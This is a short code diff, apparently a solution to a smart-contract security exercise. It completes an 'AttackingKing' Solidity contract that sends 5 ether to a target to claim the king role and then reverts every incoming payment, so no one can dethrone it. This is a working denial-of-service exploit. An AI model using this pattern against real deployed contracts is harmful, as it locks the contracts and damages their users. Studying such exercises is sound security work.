@@ -11,6 +11,12 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        //Sending 5 eth to become king 
+        payable(contractAddress).call{value : 5 ether}("");
+    }
+
+    receive() external payable {
+        //Reverting transaction when the contract receives eth.
+        require(false,"Not today");
     }
 }
